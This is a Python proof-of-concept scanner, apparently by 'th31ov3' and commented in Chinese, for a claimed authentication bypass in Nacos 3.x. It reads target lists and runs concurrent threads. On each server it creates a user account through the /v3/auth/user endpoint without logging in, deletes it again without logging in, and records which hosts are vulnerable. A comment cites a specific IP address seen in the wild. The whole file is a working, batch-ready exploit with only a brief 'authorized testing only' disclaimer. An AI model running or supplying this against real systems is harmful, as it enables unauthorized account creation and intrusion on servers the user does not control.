#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Nacos 3.x 用户/角色管理接口权限绕过漏洞 - 批量检测 PoC
影响版本: 3.0.0 ~ 3.2.3 (默认部署 nacos.core.auth.enabled=false 即可利用)
Author: th31ov3

用法:
  python poc.py http://target:8848                          # 单目标
  python poc.py http://t1:8848 http://t2:8848               # 多目标
  python poc.py -f targets.txt                              # 从文件读取目标(每行一个, 支持#注释)
  python poc.py -f targets.txt -o result.txt                # 结果实时写入 TXT(TSV)
  python poc.py -f targets.txt -o result.xlsx               # 结果实时写入 Excel(需 openpyxl)
  python poc.py -f targets.txt -o result.json               # 结果实时写入 JSON
  python poc.py http://target:8848 --keep                   # 保留测试用户(默认自动清理)

判定标准:
  [VULN]     未认证 POST /nacos/v3/auth/user 返回 200 且 code=0 → 漏洞存在
  [SAFE]     返回 403 → 已进入 Admin API 鉴权流程, 不受影响
  [UNKNOWN]  网络异常 / 响应异常

仅用于已授权的安全测试。
"""
import argparse
import json
import random
import string
import sys
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

try:
    import requests
    import urllib3
    urllib3.disable_warnings()
except ImportError:
    print("[-] 缺少 requests 库: pip install requests")
    sys.exit(1)

TAG = "[Nacos3x-Bypass]"


def rand_suffix(n: int = 8) -> str:
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def normalize_url(target: str) -> str:
    """剥离 #前端路由 / ?参数, 只保留 scheme://host[:port][/path]"""
    p = urlparse(target if "://" in target else "http://" + target)
    base = f"{p.scheme}://{p.netloc}"
    # 只取真正的 path, 忽略 fragment/query
    path = p.path or ""
    # 去掉可能的尾部斜杠
    return (base + path).rstrip("/")


def candidate_api_bases(target: str) -> list:
    """生成候选 API 基址列表(按优先级排序)。
    真实环境常见形态(实测):
      - API 在 http://host:8848/nacos/v3/...   ← 最常见, 3.x 官方部署
      - API 在 http://host:8848/v3/...        ← 控制台与API同端口形态(如 158.160.70.252)
      - 控制台在 8080, API 仍在 8848/nacos    ← 3.x 双端口分离
      - 控制台 8080 也代理 API(根路径)        ← 部分部署
    """
    base = normalize_url(target)
    m = urlparse(base)
    # 8848(API 端口)优先于 8080(控制台端口), 因为漏洞入口几乎都在 8848
    hosts = []
    try:
        if m.port == 8080:
            hosts.append(f"{m.scheme}://{m.hostname}:8848")
    except ValueError:
        pass
    hosts.append(base)
    try:
        if m.port == 8848:
            hosts.append(f"{m.scheme}://{m.hostname}:8080")
    except ValueError:
        pass

    candidates = []
    for h in hosts:
        candidates.append(h + "/nacos") # API 挂 /nacos 上下文(官方默认, 优先)
        candidates.append(h)            # API 直接挂根路径
    # 去重保序
    seen = set()
    return [c for c in candidates if not (c in seen or seen.add(c))]


def looks_like_nacos(resp) -> bool:
    """判断响应是否带 Nacos 特征(用于确认 API 基址真实可达)。"""
    if resp.status_code == 404:
        return False
    text = resp.text[:500].lower()
    markers = ("nacos", "accesstoken", "user not found", "unknown user",
               "access denied", "authorization failed", "no auth")
    return any(k in text for k in markers)


def detect(target: str, keep: bool = False, timeout: float = 10) -> dict:
    """对单个目标做未授权创建用户检测, 返回结果 dict。
    策略: 遍历候选 API 基址, 对每个基址直接做漏洞检测(而非先探测再检测),
    任一基址创建成功即 VULN; 全部 403 则 SAFE; 无法确认则 UNKNOWN。
    """
    raw = target
    target = normalize_url(target)
    result = {
        "target": raw,
        "api_base": None,
        "status": "UNKNOWN",
        "detail": "",
        "username": None,
        "http_code": None,
        "cleaned": False,
    }

    username = f"poc_{rand_suffix()}"
    password = f"Poc@{rand_suffix(6)}"
    result["username"] = username

    tried = []          # (基址, 状态码, 响应片段)
    found_nacos = False # 是否确认过这是 Nacos 服务

    for api_base in candidate_api_bases(target):
        # 先确认该基址是 Nacos(login 接口特征)
        try:
            lr = requests.post(
                f"{api_base}/v3/auth/user/login",
                data={"username": "nacosprobe", "password": "x"},
                verify=False, timeout=timeout,
            )
            if not looks_like_nacos(lr):
                # 非 Nacos 服务(如微信网关), 记录用于区分"不可达"与"非Nacos"
                tried.append((api_base, lr.status_code, lr.text[:80] or f"(空响应)"))
                continue
            found_nacos = True
        except requests.RequestException as e:
            tried.append((api_base, None, e.__class__.__name__))
            continue

        # 核心检测: 未认证创建用户
        try:
            r = requests.post(
                f"{api_base}/v3/auth/user",
                data={"username": username, "password": password},
                verify=False, timeout=timeout,
            )
        except requests.RequestException as e:
            tried.append((api_base, None, e.__class__.__name__))
            continue
        tried.append((api_base, r.status_code, r.text[:80]))
        result["http_code"] = r.status_code

        if r.status_code == 200 and '"code":0' in r.text:
            result["status"] = "VULN"
            result["api_base"] = api_base
            result["detail"] = f"未授权创建用户 {username} 成功"
            if not keep:
                # 清理痕迹: deleteUser 同为漏标接口, 未认证即可删
                try:
                    d = requests.delete(
                        f"{api_base}/v3/auth/user",
                        params={"username": username},
                        verify=False, timeout=timeout,
                    )
                    if d.status_code == 200 and '"code":0' in d.text:
                        result["cleaned"] = True
                except requests.RequestException:
                    pass
            return result

        if r.status_code == 403:
            # 该基址进入了鉴权流程(已修复或开启鉴权), 记住但继续试其他基址
            result["api_base"] = api_base
            result["detail"] = "已进入 Admin API 鉴权流程(已修复或开启鉴权)"
            continue
        # 其他状态码(500 参数错/400), 记录继续

    if found_nacos and result["detail"] == "已进入 Admin API 鉴权流程(已修复或开启鉴权)":
        result["status"] = "SAFE"
    elif not found_nacos:
        if tried:
            # 有响应但非 Nacos 特征(如微信网关、其他服务)
            b, code, frag = tried[-1]
            result["status"] = "SAFE"
            result["detail"] = f"非 Nacos 服务({b} -> {code}: {frag[:50]})"
        else:
            # 全部候选都连接失败
            result["detail"] = "目标不可达(所有候选基址连接失败)"
    else:
        # 有 Nacos 特征但状态异常, 保留最后一次尝试详情
        if tried:
            b, code, frag = tried[-1]
            result["detail"] = f"API 可达但响应异常 {b} -> {code}: {frag[:60]}"
    return result


def load_targets_from_file(path: str) -> list:
    targets = []
    with open(path, "r", encoding="utf-8") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                targets.append(line)
    return targets


class ResultWriter:
    """流式结果写入器: 每命中一个目标立即写盘, 不等全部完成。
    支持格式: .txt(TSV) / .xlsx(Excel) / .json
    """
    def __init__(self, path: str | None):
        self.path = path
        self.rows = []          # 已写入的行(供最后汇总)
        self._json_file = None
        self._xlsx = None
        self._xlsx_ws = None
        if not path:
            return
        import os
        path = os.path.abspath(path)   # 转 Windows 绝对路径(兼容 Git Bash 的 /tmp 等)
        self.path = path
        ext = path.lower().rsplit(".", 1)[-1] if "." in path else ""
        self.format = ext
        if ext == "xlsx":
            try:
                from openpyxl import Workbook
                self._xlsx = Workbook()
                self._xlsx_ws = self._xlsx.active
                self._xlsx_ws.title = "nacos_poc"
                self._xlsx_ws.append(["target", "status", "api_base", "detail",
                                      "username", "http_code", "cleaned", "time"])
                self._xlsx.save(path)  # 先落盘表头, 保证文件立即可见
                self.format = "xlsx"
            except ImportError:
                print(f"{TAG} [-] 未安装 openpyxl, xlsx 输出不可用: pip install openpyxl")
                print(f"{TAG}     改用 TXT 输出: {path}.txt")
                self.path = path + ".txt"
                self.format = "txt"
                self._xlsx = None
            except Exception as e:
                print(f"{TAG} [-] xlsx 初始化失败({e.__class__.__name__}: {e}), 改用 TXT")
                self.path = path + ".txt"
                self.format = "txt"
                self._xlsx = None
        if self.format == "txt":
            # 写表头
            with open(self.path, "w", encoding="utf-8") as f:
                f.write("target\tstatus\tapi_base\tdetail\tusername\thttp_code\tcleaned\ttime\n")
        elif self.format == "json":
            with open(self.path, "w", encoding="utf-8") as f:
                f.write("[\n")
        # xlsx 分支无需额外初始化(表头已在上面写)

    def write(self, r: dict):
        """写入单个结果(立即落盘)"""
        if not self.path:
            return
        import datetime
        ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        row = [r["target"], r["status"], r.get("api_base") or "-",
               r["detail"], r.get("username") or "-", r.get("http_code") or "-",
               "yes" if r.get("cleaned") else "no", ts]
        self.rows.append(r)
        if self.format == "txt":
            # \t 和 \n 会破坏 TSV 结构, 替换掉
            clean = [str(x).replace("\t", " ").replace("\n", " ") for x in row]
            with open(self.path, "a", encoding="utf-8") as f:
                f.write("\t".join(clean) + "\n")
        elif self.format == "xlsx":
            self._xlsx_ws.append(row)
            self._xlsx.save(self.path)
        elif self.format == "json":
            entry = json.dumps(r, ensure_ascii=False)
            prefix = ",\n" if len(self.rows) > 1 else ""
            with open(self.path, "a", encoding="utf-8") as f:
                f.write(prefix + "  " + entry)

    def close(self):
        """收尾: json 补闭合括号"""
        if self.path and self.format == "json":
            with open(self.path, "a", encoding="utf-8") as f:
                f.write("\n]\n")


def main():
    banner = r"""
.____    ____________   _______________ _________.___  ___ ___  ____ ___.___
|    |   \_____  \   \ /   /\_   _____//   _____/|   |/   |   \|    |   \   |
|    |    /   |   \   Y   /  |    __)_ \_____  \ |   /    ~    \    |   /   |
|    |___/    |    \     /   |        \/        \|   \    Y    /    |  /|   |
|_______ \_______  /\___/   /_______  /_______  /|___|\___|_  /|______/ |___|
        \/       \/                 \/        \/            \/
        Nacos 3.x 权限绕过 - 批量检测 PoC (3.0.0 ~ 3.2.3)
                        by th31ov3
"""
    parser = argparse.ArgumentParser(description="Nacos 3.x auth bypass PoC")
    parser.add_argument("targets", nargs="*", help="目标 URL, 如 http://ip:8848")
    parser.add_argument("-f", "--file", help="目标文件(每行一个)")
    parser.add_argument("-o", "--output", help="结果输出文件, 支持格式: .txt / .xlsx / .json; 每命中一个目标立即写入")
    parser.add_argument("-t", "--threads", type=int, default=10, help="并发数(默认10)")
    parser.add_argument("--timeout", type=float, default=10, help="请求超时秒数(默认10)")
    parser.add_argument("--keep", action="store_true", help="保留测试用户(默认自动清理)")
    args = parser.parse_args()

    print(banner)
    print(f"{TAG} 仅用于已授权的安全测试\n")

    targets = list(args.targets)
    if args.file:
        targets.extend(load_targets_from_file(args.file))
    if not targets:
        parser.print_help()
        sys.exit(1)

    print(f"{TAG} 共 {len(targets)} 个目标, 并发 {args.threads}\n")

    results = []
    writer = ResultWriter(args.output)
    with ThreadPoolExecutor(max_workers=args.threads) as pool:
        futures = {pool.submit(detect, t, args.keep, args.timeout): t for t in targets}
        for fut in as_completed(futures):
            r = fut.result()
            results.append(r)
            writer.write(r)   # 命中一个立即写盘
            mark = {
                "VULN": "\033[91m[VULN]\033[0m",    # 红
                "SAFE": "\033[92m[SAFE]\033[0m",    # 绿
                "UNKNOWN": "\033[93m[UNKNOWN]\033[0m",  # 黄
            }[r["status"]]
            clean = " (已清理)" if r.get("cleaned") else ""
            api = f" [API: {r['api_base']}]" if r.get("api_base") and r["api_base"] != r["target"] else ""
            print(f"  {mark} {r['target']:50s} {r['detail']}{clean}{api}")

    writer.close()

    # 汇总
    vuln = [r for r in results if r["status"] == "VULN"]
    safe = [r for r in results if r["status"] == "SAFE"]
    unknown = [r for r in results if r["status"] == "UNKNOWN"]
    print(f"\n{TAG} 检测完成: 共 {len(results)} | 漏洞 {len(vuln)} | 安全 {len(safe)} | 未知 {len(unknown)}")

    if vuln:
        print(f"{TAG} 存在漏洞的目标:")
        for r in vuln:
            print(f"    - {r['target']}  (测试账号: {r['username']})")

    if args.output:
        print(f"{TAG} 结果已实时写入 {writer.path}")

    sys.exit(1 if vuln else 0)


if __name__ == "__main__":
    main()
